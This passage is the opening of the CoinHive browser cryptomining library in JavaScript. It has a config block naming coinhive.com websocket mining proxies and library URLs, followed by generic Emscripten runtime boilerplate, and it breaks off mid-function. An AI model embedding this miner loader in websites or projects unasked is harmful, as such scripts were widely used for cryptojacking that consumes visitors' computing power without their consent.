self.CoinHive = self.CoinHive || {};
self.CoinHive.CONFIG = {
    LIB_URL: "https://coinhive.com/lib/",
    WEBSOCKET_SHARDS: [
        ["wss://ws001.coinhive.com/proxy", "wss://ws002.coinhive.com/proxy", "wss://ws003.coinhive.com/proxy", "wss://ws004.coinhive.com/proxy", "wss://ws005.coinhive.com/proxy", "wss://ws006.coinhive.com/proxy", "wss://ws007.coinhive.com/proxy", "wss://ws029.coinhive.com/proxy"],
        ["wss://ws008.coinhive.com/proxy", "wss://ws009.coinhive.com/proxy", "wss://ws010.coinhive.com/proxy", "wss://ws011.coinhive.com/proxy", "wss://ws012.coinhive.com/proxy", "wss://ws013.coinhive.com/proxy", "wss://ws014.coinhive.com/proxy", "wss://ws030.coinhive.com/proxy"],
        ["wss://ws015.coinhive.com/proxy", "wss://ws016.coinhive.com/proxy", "wss://ws017.coinhive.com/proxy", "wss://ws018.coinhive.com/proxy", "wss://ws019.coinhive.com/proxy", "wss://ws020.coinhive.com/proxy", "wss://ws021.coinhive.com/proxy", "wss://ws031.coinhive.com/proxy"],
        ["wss://ws022.coinhive.com/proxy", "wss://ws023.coinhive.com/proxy", "wss://ws024.coinhive.com/proxy", "wss://ws025.coinhive.com/proxy", "wss://ws026.coinhive.com/proxy", "wss://ws027.coinhive.com/proxy", "wss://ws028.coinhive.com/proxy", "wss://ws032.coinhive.com/proxy"]
    ],
    CAPTCHA_URL: "https://coinhive.com/captcha/",
    MINER_URL: "https://coinhive.com/media/miner.html"
};
var Module = {
    locateFile: (function(path) {
        return CoinHive.CONFIG.LIB_URL + path
    })
};
var Module;
if (!Module) Module = (typeof Module !== "undefined" ? Module : null) || {};
var moduleOverrides = {};
for (var key in Module) {
    if (Module.hasOwnProperty(key)) {
        moduleOverrides[key] = Module[key]
    }
}
var ENVIRONMENT_IS_WEB = false;
var ENVIRONMENT_IS_WORKER = false;
var ENVIRONMENT_IS_NODE = false;
var ENVIRONMENT_IS_SHELL = false;
if (Module["ENVIRONMENT"]) {
    if (Module["ENVIRONMENT"] === "WEB") {
        ENVIRONMENT_IS_WEB = true
    } else if (Module["ENVIRONMENT"] === "WORKER") {
        ENVIRONMENT_IS_WORKER = true
    } else if (Module["ENVIRONMENT"] === "NODE") {
        ENVIRONMENT_IS_NODE = true
    } else if (Module["ENVIRONMENT"] === "SHELL") {
        ENVIRONMENT_IS_SHELL = true
    } else {
        throw new Error("The provided Module['ENVIRONMENT'] value is not valid. It must be one of: WEB|WORKER|NODE|SHELL.")
    }
} else {
    ENVIRONMENT_IS_WEB = typeof window === "object";
    ENVIRONMENT_IS_WORKER = typeof importScripts === "function";
    ENVIRONMENT_IS_NODE = typeof process === "object" && typeof require === "function" && !ENVIRONMENT_IS_WEB && !ENVIRONMENT_IS_WORKER;
    ENVIRONMENT_IS_SHELL = !ENVIRONMENT_IS_WEB && !ENVIRONMENT_IS_NODE && !ENVIRONMENT_IS_WORKER
}
if (ENVIRONMENT_IS_NODE) {
    if (!Module["print"]) Module["print"] = console.log;
    if (!Module["printErr"]) Module["printErr"] = console.warn;
    var nodeFS;
    var nodePath;
    Module["read"] = function shell_read(filename, binary) {
        if (!nodeFS) nodeFS = require("fs");
        if (!nodePath) nodePath = require("path");
        filename = nodePath["normalize"](filename);
        var ret = nodeFS["readFileSync"](filename);
        return binary ? ret : ret.toString()
    };
    Module["readBinary"] = function readBinary(filename) {
        var ret = Module["read"](filename, true);
        if (!ret.buffer) {
            ret = new Uint8Array(ret)
        }
        assert(ret.buffer);
        return ret
    };
    Module["load"] = function load(f) {
        globalEval(read(f))
    };
    if (!Module["thisProgram"]) {
        if (process["argv"].length > 1) {
            Module["thisProgram"] = process["argv"][1].replace(/\\/g, "/")
        } else {
            Module["thisProgram"] = "unknown-program"
        }
    }
    Module["arguments"] = process["argv"].slice(2);
    if (typeof module !== "undefined") {
        module["exports"] = Module
    }
    process["on"]("uncaughtException", (function(ex) {
        if (!(ex instanceof ExitStatus)) {
            throw ex
        }
    }));
    Module["inspect"] = (function() {
        return "[Emscripten Module object]"
    })
} else if (ENVIRONMENT_IS_SHELL) {
    if (!Module["print"]) Module["print"] = print;
    if (typeof printErr != "undefined") Module["printErr"] = printErr;
    if (typeof read != "undefined") {
        Module["read"] = read
    } else {
        Module["read"] = function shell_read() {
            throw "no read() available"
        }
    }
    Module["readBinary"] = function readBinary(f) {
        if (typeof readbuffer === "function") {
            return new Uint8Array(readbuffer(f))
        }
        var data = read(f, "binary");
        assert(typeof data === "object");
        return data
    };
    if (typeof scriptArgs != "undefined") {
        Module["arguments"] = scriptArgs
    } else if (typeof arguments != "undefined") {
        Module["arguments"] = arguments
    }
    if (typeof quit === "function") {
        Module["quit"] = (function(status, toThrow) {
            quit(status)
        })
    }
} else if (ENVIRONMENT_IS_WEB || ENVIRONMENT_IS_WORKER) {
    Module["read"] = function shell_read(url) {
        var xhr = new XMLHttpRequest;
        xhr.open("GET", url, false);
        xhr.send(null);
        return xhr.responseText
    };
    if (ENVIRONMENT_IS_WORKER) {
        Module["readBinary"] = function readBinary(url) {
            var xhr = new XMLHttpRequest;
            xhr.open("GET", url, false);
            xhr.responseType = "arraybuffer";
            xhr.send(null);
            return new Uint8Array(xhr.response)
        }
    }
    Module["readAsync"] = function readAsync(url, onload, onerror) {
        var xhr = new XMLHttpRequest;
        xhr.open("GET", url, true);
        xhr.responseType = "arraybuffer";
        xhr.onload = function xhr_onload() {
            if (xhr.status == 200 || xhr.status == 0 && xhr.response) {
                onload(xhr.response)
            } else {
                onerror()
            }
        };
        xhr.onerror = onerror;
        xhr.send(null)
    };
    if (typeof arguments != "undefined") {
        Module["arguments"] = arguments
    }
    if (typeof console !== "undefined") {
        if (!Module["print"]) Module["print"] = function shell_print(x) {
            console.log(x)
        };
        if (!Module["printErr"]) Module["printErr"] = function shell_printErr(x) {
            console.warn(x)
        }
    } else {
        var TRY_USE_DUMP = false;
        if (!Module["print"]) Module["print"] = TRY_USE_DUMP && typeof dump !== "undefined" ? (function(x) {
            dump(x)
        }) : (function(x) {})
    }
    if (ENVIRONMENT_IS_WORKER) {
        Module["load"] = importScripts
    }
    if (typeof Module["setWindowTitle"] === "undefined") {
        Module["setWindowTitle"] = (function(title) {
            document.title = title
        })
    }
} else {
    throw "Unknown runtime environment. Where are we?"
}

function globalEval(x) {
    eval.call(null, x)
}
if (!Module["load"] && Module["read"]) {
    Module["load"] = function load(f) {
        globalEval(Module["read"](f))
    }
}
if (!Module["print"]) {
    Module["print"] = (function() {})
}
if (!Module["printErr"]) {
    Module["printErr"] = Module["print"]
}
if (!Module["arguments"]) {
    Module["arguments"] = []
}
if (!Module["thisProgram"]) {
    Module["thisProgram"] = "./this.program"
}
if (!Module["quit"]) {
    Module["quit"] = (function(status, toThrow) {
        throw toThrow
    })
}
Module.print = Module["print"];
Module.printErr = Module["printErr"];
Module["preRun"] = [];
Module["postRun"] = [];
for (var key in moduleOverrides) {
    if (moduleOverrides.hasOwnProperty(key)) {
        Module[key] = moduleOverrides[key]
    }
}
moduleOverrides = undefined;
var Runtime = {
    setTempRet0: (function(value) {
        tempRet0 = value;
        return value
    }),
    getTempRet0: (function() {
        return tempRet0
    }),
    stackSave: (function() {
        return STACKTOP
    }),
    stackRestore: (function(stackTop) {
        STACKTOP = stackTop
    }),
    getNativeTypeSize: (function(type) {
        switch (type) {
            case "i1":
            case "i8":
                return 1;
            case "i16":
                return 2;
            case "i32":
                return 4;
            case "i64":
                return 8;
            case "float":
                return 4;
            case "double":
                return 8;
            default:
                {
                    if (type[type.length - 1] === "*") {
                        return Runtime.QUANTUM_SIZE
                    } else if (type[0] === "i") {
                        var bits = parseInt(type.substr(1));
                        assert(bits % 8 === 0);
                        return bits / 8
                    } else {
                        return 0
                    }
                }
        }
    }),
    getNativeFieldSize: (function(type) {
        return Math.max(Runtime.getNativeTypeSize(type), Runtime.QUANTUM_SIZE)
    }),
    STACK_ALIGN: 16,
    prepVararg: (function(ptr, type) {
        if (type === "double" || type === "i64") {
            if (ptr & 7) {
                assert((ptr & 7) === 4);
                ptr += 4
            }
        } else {
            assert((ptr & 3) === 0)
        }
        return ptr
    }),
    getAlignSize: (function(type, size, vararg) {
        if (!vararg && (type == "i64" || type == "double")) return 8;
        if (!type) return Math.min(size, 8);
        return Math.min(size || (type ? Runtime.getNativeFieldSize(type) : 0), Runtime.QUANTUM_SIZE)
    }),
    dynCall: (function(sig, ptr, args) {
        if (args && args.length) {
            return Module["dynCall_" + sig].apply(null, [ptr].concat(args))
        } else {
            return Module["dynCall_" + sig].call(null, ptr)
        }
    }),
    functionPointers: [],
    addFunction: (function(func) {
        for (var i = 0; i < Runtime.functionPointers.length; i++) {
            if (!Runtime.functionPointers[i]) {
                Runtime.functionPointers[i] = func;
                return 2 * (1 + i)
            }
        }
        throw "Finished up all reserved function pointers. Use a higher value for RESERVED_FUNCTION_POINTERS."
    }),
    removeFunction: (function(index) {
        Runtime.functionPointers[(index - 2) / 2] = null
    }),
    warnOnce: (function(text) {
        if (!Runtime.warnOnce.shown) Runtime.warnOnce.shown = {};
        if (!Runtime.warnOnce.shown[text]) {
            Runtime.warnOnce.shown[text] = 1;
            Module.printErr(text)
        }
    }),
    funcWrappers: {},
    getFuncWrapper: (function(func, sig) {
        assert(sig);
        if (!Runtime.funcWrappers[sig]) {
            Runtime.funcWrappers[sig] = {}
        }
        var sigCache = Runtime.funcWrappers[sig];
        if (!sigCache[func]) {
            if (sig.length === 1) {
                sigCache[func] = function dynCall_wrapper() {
                    return Runtime.dynCall(sig, func)
                }
            } else if (sig.length === 2) {
                sigCache[func] = function dynCall_wrapper(arg) {
                    return Runtime.dynCall(sig, func, [arg])
                }
            } else {
                sigCache[func] = function dynCall_wrapper() {
                    return Runtime.dynCall(sig, func, Array.prototype.slice.call(arguments))
                }
            }
        }
        return sigCache[func]
    }),
    getCompilerSetting: (function(name) {
        throw "You must build with -s RETAIN_COMPILER_SETTINGS=1 for Runtime.getCompilerSetting or emscripten_get_compiler_setting to work"
    }),
    stackAlloc: (function(size) {
        var ret = STACKTOP;
        STACKTOP = STACKTOP + size | 0;
        STACKTOP = STACKTOP + 15 & -16;
        return ret
    }),
    staticAlloc: (function(size) {
        var ret = STATICTOP;
        STATICTOP = STATICTOP + size | 0;
        STATICTOP = STATICTOP + 15 & -16;
        return ret
    }),
    dynamicAlloc: (function(size) {
        var ret = HEAP32[DYNAMICTOP_PTR >> 2];
        var end = (ret + size + 15 | 0) & -16;
        HEAP32[DYNAMICTOP_PTR >> 2] = end;
        if (end >= TOTAL_MEMORY) {
            var success = enlargeMemory();
            if (!success) {
                HEAP32[DYNAMICTOP_PTR >> 2] = ret;
                return 0
            }
        }
        return ret
    }),
    alignMemory: (function(size, quantum) {
        var ret = size = Math.ceil(size / (quantum ? quantum : 16)) * (quantum ? quantum : 16);
        return ret
    }),
    makeBigInt: (function(low, high, unsigned) {
        var ret = unsigned ? +(low >>> 0) + +(high >>> 0) * +4294967296 : +(low >>> 0) + +(high | 0) * +4294967296;
        return ret
    }),
    GLOBAL_BASE: 8,
    QUANTUM_SIZE: 4,
    __dummy__: 0
};
Module["Runtime"] = Runtime;
var ABORT = 0;
var EXITSTATUS = 0;

function assert(condition, text) {
    if (!condition) {
        abort("Assertion failed: " + text)
    }
}

function getCFunc(ident) {
    var func = Module["_" + ident];
    if (!func) {
        try {
            func = eval("_" + ident)
        } catch (e) {}
    }
    assert(func, "Cannot call unknown function " + ident + " (perhaps LLVM optimizations or closure removed it?)");
    return func
}
var cwrap, ccall;
((function() {
    var JSfuncs = {
        "stackSave": (function() {
            Runtime.stackSave()
        }),
        "stackRestore": (function() {
            Runtime.stackRestore()
        }),
        "arrayToC": (function(arr) {
            var ret = Runtime.stackAlloc(arr.length);
            writeArrayToMemory(arr, ret);
            return ret
        }),
        "stringToC": (function(str) {
            var ret = 0;
            if (str !== null && str !== undefined && str !== 0) {
                var len = (str.length << 2) + 1;
                ret = Runtime.stackAlloc(len);
                stringToUTF8(str, ret, len)
            }
            return ret
        })
    };
    var toC = {
        "string": JSfuncs["stringToC"],
        "array": JSfuncs["arrayToC"]
    };
    ccall = function ccallFunc(ident, returnType, argTypes, args, opts) {
        var func = getCFunc(ident);
        var cArgs = [];
        var stack = 0;
        if (args) {
            for (var i = 0; i < args.length; i++) {
                var converter = toC[argTypes[i]];
                if (converter) {
                    if (stack === 0) stack = Runtime.stackSave();
                    cArgs[i] = converter(args[i])
                } else {
                    cArgs[i] = args[i]
                }
            }
        }
        var ret = func.apply(null, cArgs);
        if (returnType === "string") ret = Pointer_stringify(ret);
        if (stack !== 0) {
            if (opts && opts.async) {
                EmterpreterAsync.asyncFinalizers.push((function() {
                    Runtime.stackRestore(stack)
                }));
                return
            }
            Runtime.stackRestore(stack)
        }
        return ret
    };
    var sourceRegex = /^function\s*[a-zA-Z$_0-9]*\s*\(([^)]*)\)\s*{\s*([^*]*?)[\s;]*(?:return\s*(.*?)[;\s]*)?}$/;

    function parseJSFunc(jsfunc) {
        var parsed = jsfunc.toString().match(sourceRegex).slice(1);
        return {
            arguments: parsed[0],
            body: parsed[1],
            returnValue: parsed[2]
        }
    }
    var JSsource = null;

    function ensureJSsource() {
        if (!JSsource) {
            JSsource = {};
            for (var fun in JSfuncs) {
                if (JSfuncs.hasOwnProperty(fun)) {
                    JSsource[fun] = parseJSFunc(JSfuncs[fun])
                }
            }
        }
    }
    cwrap = function cwrap(ident, returnType, argTypes) {
        argTypes = argTypes || [];
        var cfunc = getCFunc(ident);
        var numericArgs = argTypes.every((function(type) {
            return type === "number"
        }));
        var numericRet = returnType !== "string";
        if (numericRet && numericArgs) {
            return cfunc
        }
        var argNames = argTypes.map((function(x, i) {
            return "$" + i
        }));
        var funcstr = "(function(" + argNames.join(",") + ") {";
        var nargs = argTypes.length;
        if (!numericArgs) {
            ensureJSsource();
            funcstr += "var stack = " + JSsource["stackSave"].body + ";";
            for (var i = 0; i < nargs; i++) {
                var arg = argNames[i],
                    type = argTypes[i];
                if (type === "number") continue;
                var convertCode = JSsource[type + "ToC"];
                funcstr += "var " + convertCode.arguments + " = " + arg + ";";
                funcstr += convertCode.body + ";";
                funcstr += arg + "=(" + convertCode.returnValue + ");"
            }
        }
        var cfuncname = parseJSFunc((function() {
            return cfunc
        })).returnValue;
        funcstr += "var ret = " + cfuncname + "(" + argNames.join(",") + ");";
        if (!numericRet) {
            var strgfy = parseJSFunc((function() {
                return Pointer_stringify
            })).returnValue;
            funcstr += "ret = " + strgfy + "(ret);"
        }
        if (!numericArgs) {
            ensureJSsource();
            funcstr += JSsource["stackRestore"].body.replace("()", "(stack)") + ";"
        }
        funcstr += "return ret})";
        return eval(funcstr)
    }
}))();
Module["ccall"] = ccall;
Module["cwrap"] = cwrap;

function setValue(ptr, value, type, noSafe) {
    type = type || "i8";
    if (type.charAt(type.length - 1) === "*") type = "i32";
    switch (type) {
        case "i1":
            HEAP8[ptr >> 0] = value;
            break;
        case "i8":
            HEAP8[ptr >> 0] = value;
            break;
        case "i16":
            HEAP16[ptr >> 1] = value;
            break;
        case "i32":
            HEAP32[ptr >> 2] = value;
            break;
        case "i64":
            tempI64 = [value >>> 0, (tempDouble = value, +Math_abs(tempDouble) >= +1 ? tempDouble > +0 ? (Math_min(+Math_floor(tempDouble / +4294967296), +4294967295) | 0) >>> 0 : ~~+Math_ceil((tempDouble - +(~~tempDouble >>> 0)) / +4294967296) >>> 0 : 0)], HEAP32[ptr >> 2] = tempI64[0], HEAP32[ptr + 4 >> 2] = tempI64[1];
            break;
        case "float":
            HEAPF32[ptr >> 2] = value;
            break;
        case "double":
            HEAPF64[ptr >> 3] = value;
            break;
        default:
            abort("invalid type for setValue: " + type)
    }
}
Module["setValue"] = setValue;

function getValue(ptr, type, noSafe) {
    type = type || "i8";
    if (type.charAt(type.length - 1) === "*") type = "i32";
    switch (type) {
        case "i1":
            return HEAP8[ptr >> 0];
        case "i8":
            return HEAP8[ptr >> 0];
        case "i16":
            return HEAP16[ptr >> 1];
        case "i32":
            return HEAP32[ptr >> 2];
        case "i64":
            return HEAP32[ptr >> 2];
        case "float":
            return HEAPF32[ptr >> 2];
        case "double":
            return HEAPF64[ptr >> 3];
        default:
            abort("invalid type for setValue: " + type)
    }
    return null
}
Module["getValue"] = getValue;
var ALLOC_NORMAL = 0;
var ALLOC_STACK = 1;
var ALLOC_STATIC = 2;
var ALLOC_DYNAMIC = 3;
var ALLOC_NONE = 4;
Module["ALLOC_NORMAL"] = ALLOC_NORMAL;
Module["ALLOC_STACK"] = ALLOC_STACK;
Module["ALLOC_STATIC"] = ALLOC_STATIC;
Module["ALLOC_DYNAMIC"] = ALLOC_DYNAMIC;
Module["ALLOC_NONE"] = ALLOC_NONE;

function allocate(slab, types, allocator, ptr) {
    var zeroinit, size;
    if (typeof slab === "number") {
        zeroinit = true;
        size = slab
    } else {
        zeroinit = false;
        size = slab.length
    }
    var singleType = typeof types === "string" ? types : null;
    var ret;
    if (allocator == ALLOC_NONE) {
        ret = ptr
    } else {
        ret = [typeof _malloc === "function" ? _malloc : Runtime.staticAlloc, Runtime.stackAlloc, Runtime.staticAlloc, Runtime.dynamicAlloc][allocator === undefined ? ALLOC_STATIC : allocator](Math.max(size, singleType ? 1 : types.length))
    }
    if (zeroinit) {
        var ptr = ret,
            stop;
        assert((ret & 3) == 0);
        stop = ret + (size & ~3);
        for (; ptr < stop; ptr += 4) {
            HEAP32[ptr >> 2] = 0
        }
        stop = ret + size;
        while (ptr < stop) {
            HEAP8[ptr++ >> 0] = 0
        }
        return ret
    }
    if (singleType === "i8") {
        if (slab.subarray || slab.slice) {
            HEAPU8.set(slab, ret)
        } else {
            HEAPU8.set(new Uint8Array(slab), ret)
        }
        return ret
    }
    var i = 0,
        type, typeSize, previousType;
    while (i < size) {
        var curr = slab[i];
        if (typeof curr === "function") {
            curr = Runtime.getFunctionIndex(curr)
        }
        type = singleType || types[i];
        if (type === 0) {
            i++;
            continue
        }
        if (type == "i64") type = "i32";
        setValue(ret + i, curr, type);
        if (previousType !== type) {
            typeSize = Runtime.getNativeTypeSize(type);
            previousType = type
        }
        i += typeSize
    }
    return ret
}
Module["allocate"] = allocate;

function getMemory(size) {
    if (!staticSealed) return Runtime.staticAlloc(size);
    if (!runtimeInitialized) return Runtime.dynamicAlloc(size);
    return _malloc(size)
}
Module["getMemory"] = getMemory;

function Pointer_stringify(ptr, length) {
    if (length === 0 || !ptr) return "";
    var hasUtf = 0;
    var t;
    var i = 0;
    while (1) {
        t = HEAPU8[ptr + i >> 0];
        hasUtf |= t;
        if (t == 0 && !length) break;
        i++;
        if (length && i == length) break
    }
    if (!length) length = i;
    var ret = "";
    if (hasUtf < 128) {
        var MAX_CHUNK = 1024;
        var curr;
        while (length > 0) {
            curr = String.fromCharCode.apply(String, HEAPU8.subarray(ptr, ptr + Math.min(length, MAX_CHUNK)));
            ret = ret ? ret + curr : curr;
            ptr += MAX_CHUNK;
            length -= MAX_CHUNK
        }
        return ret
    }
    return Module["UTF8ToString"](ptr)
}
Module["Pointer_stringify"] = Pointer_stringify;

function AsciiToString(ptr) {
    var str = "";
    while (1) {
        var ch = HEAP8[ptr++ >> 0];
        if (!ch) return str;
        str += String.fromCharCode(ch)
    }
}
Module["AsciiToString"] = AsciiToString;

function stringToAscii(str, outPtr) {
    return writeAsciiToMemory(str, outPtr, false)
}
Module["stringToAscii"] = stringToAscii;
var UTF8Decoder = typeof TextDecoder !== "undefined" ? new TextDecoder("utf8") : undefined;

function UTF8ArrayToString(u8Array, idx) {
    var endPtr = idx;
    while (u8Array[endPtr]) ++endPtr;
    if (endPtr - idx > 16 && u8Array.subarray && UTF8Decoder) {
        return UTF8Decoder.decode(u8Array.subarray(idx, endPtr))
    } else {
        var u0, u1, u2, u3, u4, u5;
        var str = "";
        while (1) {
            u0 = u8Array[idx++];
            if (!u0) return str;
            if (!(u0 & 128)) {
                str += String.fromCharCode(u0);
                continue
            }
            u1 = u8Array[idx++] & 63;
            if ((u0 & 224) == 192) {
                str += String.fromCharCode((u0 & 31) << 6 | u1);
                continue
            }
            u2 = u8Array[idx++] & 63;
            if ((u0 & 240) == 224) {
                u0 = (u0 & 15) << 12 | u1 << 6 | u2
            } else {
                u3 = u8Array[idx++] & 63;
                if ((u0 & 248) == 240) {
                    u0 = (u0 & 7) << 18 | u1 << 12 | u2 << 6 | u3
                } else {
                    u4 = u8Array[idx++] & 63;
                    if ((u0 & 252) == 248) {
                        u0 = (u0 & 3) << 24 | u1 << 18 | u2 << 12 | u3 << 6 | u4
                    } else {
                        u5 = u8Array[idx++] & 63;
                        u0 = (u0 & 1) << 30 | u1 << 24 | u2 << 18 | u3 << 12 | u4 << 6 | u5
                    }
                }
            }
            if (u0 < 65536) {
                str += String.fromCharCode(u0)
            } else {
                var ch = u0 - 65536;
                str += String.fromCharCode(55296 | ch >> 10, 56320 | ch & 1023)
            }
        }
    }
}
Module["UTF8ArrayToString"] = UTF8ArrayToString;

function UTF8ToString(ptr) {
    return UTF8ArrayToString(HEAPU8, ptr)
}
Module["UTF8ToString"] = UTF8ToString;

function stringToUTF8Array(str, outU8Array, outIdx, maxBytesToWrite) {
    if (!(maxBytesToWrite > 0)) return 0;
    var startIdx = outIdx;
    var endIdx = outIdx + maxBytesToWrite - 1;
    for (var i = 0; i < str.length; ++i) {
        var u = str.charCodeAt(i);
        if (u >= 55296 && u <= 57343) u = 65536 + ((u & 1023) << 10) | str.charCodeAt(++i) & 1023;
        if (u <= 127) {
            if (outIdx >= endIdx) break;
            outU8Array[outIdx++] = u
        } else if (u <= 2047) {
            if (outIdx + 1 >= endIdx) break;
            outU8Array[outIdx++] = 192 | u >> 6;
            outU8Array[outIdx++] = 128 | u & 63
        } else if (u <= 65535) {
            if (outIdx + 2 >= endIdx) break;
            outU8Array[outIdx++] = 224 | u >> 12;
            outU8Array[outIdx++] = 128 | u >> 6 & 63;
            outU8Array[outIdx++] = 128 | u & 63
        } else if (u <= 2097151) {
            if (outIdx + 3 >= endIdx) break;
            outU8Array[outIdx++] = 240 | u >> 18;
            outU8Array[outIdx++] = 128 | u >> 12 & 63;
            outU8Array[outIdx++] = 128 | u >> 6 & 63;
            outU8Array[outIdx++] = 128 | u & 63
        } else if (u <= 67108863) {
            if (outIdx + 4 >= endIdx) break;
            outU8Array[outIdx++] = 248 | u >> 24;
            outU8Array[outIdx++] = 128 | u >> 18 & 63;
            outU8Array[outIdx++] = 128 | u >> 12 & 63;
            outU8Array[outIdx++] = 128 | u >> 6 & 63;
            outU8Array[outIdx++] = 128 | u & 63
        } else {
            if (outIdx + 5 >= endIdx) break;
            outU8Array[outIdx++] = 252 | u >> 30;
            outU8Array[outIdx++] = 128 | u >> 24 & 63;
            outU8Array[outIdx++] = 128 | u >> 18 & 63;
            outU8Array[outIdx++] = 128 | u >> 12 & 63;
            outU8Array[outIdx++] = 128 | u >> 6 & 63;
            outU8Array[outIdx++] = 128 | u & 63
        }
    }
    outU8Array[outIdx] = 0;
    return outIdx - startIdx
}
Module["stringToUTF8Array"] = stringToUTF8Array;

function stringToUTF8(str, outPtr, maxBytesToWrite) {
    return stringToUTF8Array(str, HEAPU8, outPtr, maxBytesToWrite)
}
Module["stringToUTF8"] = stringToUTF8;

function lengthBytesUTF8(str) {
    var len = 0;
    for (var i = 0; i < str.length; ++i) {
        var u = str.charCodeAt(i);
        if (u >= 55296 && u <= 57343) u = 65536 + ((u & 1023) << 10) | str.charCodeAt(++i) & 1023;
        if (u <= 127) {
            ++len
        } else if (u <= 2047) {
            len += 2
        } else if (u <= 65535) {
            len += 3
        } else if (u <= 2097151) {
            len += 4
        } else if (u <= 67108863) {
            len += 5
        } else {
            len += 6
        }
    }
    return len
}
Module["lengthBytesUTF8"] = lengthBytesUTF8;
var UTF16Decoder = typeof TextDecoder !== "undefined" ? new TextDecoder("utf-16le") : undefined;

function demangle(func) {
    var __cxa_demangle_func = Module["___cxa_demangle"] || Module["__cxa_demangle"];
    if (__cxa_demangle_func) {
        try {
            var s = func.substr(1);
            var len = lengthBytesUTF8(s) + 1;
            var buf = _malloc(len);
            stringToUTF8(s, buf, len);
            var status = _malloc(4);
            var ret = __cxa_demangle_func(buf, 0, 0, status);
            if (getValue(status, "i32") === 0 && ret) {
                return Pointer_stringify(ret)
            }
        } catch (e) {} finally {
            if (buf) _free(buf);
            if (status) _free(status);
            if (ret) _free(ret)
        }
        return func
    }
    Runtime.warnOnce("warning: build with  -s DEMANGLE_SUPPORT=1  to link in libcxxabi demangling");
    return func
}

function demangleAll(text) {
    var regex = /__Z[\w\d_]+/g;
    return text.replace(regex, (function(x) {
        var y = demangle(x);
        return x === y ? x : x + " [" + y + "]"
    }))
}

function jsStackTrace() {
    var err = new Error;
    if (!err.stack) {
        try {
            throw new Error(0)
        } catch (e) {
            err = e
        }
        if (!err.stack) {
            return "(no stack trace available)"
        }
    }
    return err.stack.toString()
}

function stackTrace() {
    var js = jsStackTrace();
    if (Module["extraStackTrace"]) js += "\n" + Module["extraStackTrace"]();
    return demangleAll(js)
}
Module["stackTrace"] = stackTrace;
var HEAP, buffer, HEAP8, HEAPU8, HEAP16, HEAPU16, HEAP32, HEAPU32, HEAPF32, HEAPF64;

function updateGlobalBufferViews() {
    Module["HEAP8"] = HEAP8 = new Int8Array(buffer);
    Module["HEAP16"] = HEAP16 = new Int16Array(buffer);
    Module["HEAP32"] = HEAP32 = new Int32Array(buffer);
    Module["HEAPU8"] = HEAPU8 = new Uint8Array(buffer);
    Module["HEAPU16"] = HEAPU16 = new Uint16Array(buffer);
    Module["HEAPU32"] = HEAPU32 = new Uint32Array(buffer);
    Module["HEAPF32"] = HEAPF32 = new Float32Array(buffer);
    Module["HEAPF64"] = HEAPF64 = new Float64Array(buffer)
}
var STATIC_BASE, STATICTOP, staticSealed;
var STACK_BASE, STACKTOP, STACK_MAX;
var DYNAMIC_BASE, DYNAMICTOP_PTR;
STATIC_BASE = STATICTOP = STACK_BASE = STACKTOP = STACK_MAX = DYNAMIC_BASE = DYNAMICTOP_PTR = 0;
staticSealed = false;

function abortOnCannotGrowMemory() {
    abort("Cannot enlarge memory arrays. Either (1) compile with  -s TOTAL_MEMORY=X  with X higher than the current value " + TOTAL_MEMORY + ", (2) compile with  -s ALLOW_MEMORY_GROWTH=1  which allows increasing the size at runtime but prevents some optimizations, (3) set Module.TOTAL_MEMORY to a higher value before the program runs, or (4) if you want malloc to return NULL (0) instead of this abort, compile with  -s ABORTING_MALLOC=0 ")
}

function enlargeMemory() {
    abortOnCannotGrowMemory()
}
var TOTAL_STACK = Module["TOTAL_STACK"] || 5242880;
var TOTAL_MEMORY = Module["TOTAL_MEMORY"] || 16777216;
if (TOTAL_MEMORY < TOTAL_STACK) Module.printErr("TOTAL_MEMORY should be larger than TOTAL_STACK, was " + TOTAL_MEMORY + "! (TOTAL_STACK=" + TOTAL_STACK + ")");
if (Module["buffer"]) {
    buffer = Module["buffer"]
} else {
    {
        buffer = new ArrayBuffer(TOTAL_MEMORY)
    }
}
updateGlobalBufferViews();

function getTotalMemory() {
    return TOTAL_MEMORY
}
HEAP32[0] = 1668509029;
HEAP16[1] = 25459;
if (HEAPU8[2] !== 115 || HEAPU8[3] !== 99) throw "Runtime error: expected the system to be little-endian!";
Module["HEAP"] = HEAP;
Module["buffer"] = buffer;
Module["HEAP8"] = HEAP8;
Module["HEAP16"] = HEAP16;
Module["HEAP32"] = HEAP32;
Module["HEAPU8"] = HEAPU8;
Module["HEAPU16"] = HEAPU16;
Module["HEAPU32"] = HEAPU32;
Module["HEAPF32"] = HEAPF32;
Module["HEAPF64"] = HEAPF64;

function callRuntimeCallbacks(callbacks) {
    while (callbacks.length > 0) {
        var callback = callbacks.shift();
        if (typeof callback == "function") {
            callback();
            continue
        }
        var func = callback.func;
        if (typeof func === "number") {
            if (callback.arg === undefined) {
                Module["dynCall_v"](func)
            } else {
                Module["dynCall_vi"](func, callback.arg)
            }
        } else {
            func(callback.arg === undefined ? null : callback.arg)
        }
    }
}
var __ATPRERUN__ = [];
var __ATINIT__ = [];
var __ATMAIN__ = [];
var __ATEXIT__ = [];
var __ATPOSTRUN__ = [];
var runtimeInitialized = false;
var runtimeExited = false;

function preRun() {
    if (Module["preRun"]) {
        if (typeof Module["preRun"] == "function") Module["preRun"] = [Module["preRun"]];
        while (Module["preRun"].length) {
            addOnPreRun(Module["preRun"].shift())
        }
    }
    callRuntimeCallbacks(__ATPRERUN__)
}

function ensureInitRuntime() {
    if (runtimeInitialized) return;
    runtimeInitialized = true;
    callRuntimeCallbacks(__ATINIT__)
}

function preMain() {
    callRuntimeCallbacks(__ATMAIN__)
}

function exitRuntime() {
    callRuntimeCallbacks(__ATEXIT__);
    runtimeExited = true
}

function postRun() {
    if (Module["postRun"]) {
        if (typeof Module["postRun"] == "function") Module["postRun"] = [Module["postRun"]];
        while (Module["postRun"].length) {
            addOnPostRun(Module["postRun"].shift())
        }
    }
    callRuntimeCallbacks(__ATPOSTRUN__)
}

function addOnPreRun(cb) {
    __ATPRERUN__.unshift(cb)
}
Module["addOnPreRun"] = addOnPreRun;

function addOnInit(cb) {
    __ATINIT__.unshift(cb)
}
Module["addOnInit"] = addOnInit;

function addOnPreMain(cb) {
    __ATMAIN__.unshift(cb)
}
Module["addOnPreMain"] = addOnPreMain;

function addOnExit(cb) {
    __ATEXIT__.unshift(cb)
}
Module["addOnExit"] = addOnExit;

function addOnPostRun(cb) {
    __ATPOSTRUN__.unshift(cb)
}
Module["addOnPostRun"] = addOnPostRun;

function intArrayFromString(stringy, dontAddNull, length) {
    var len = length > 0 ? length : lengthBytesUTF8(stringy) + 1;
    var u8array = new Array(len);
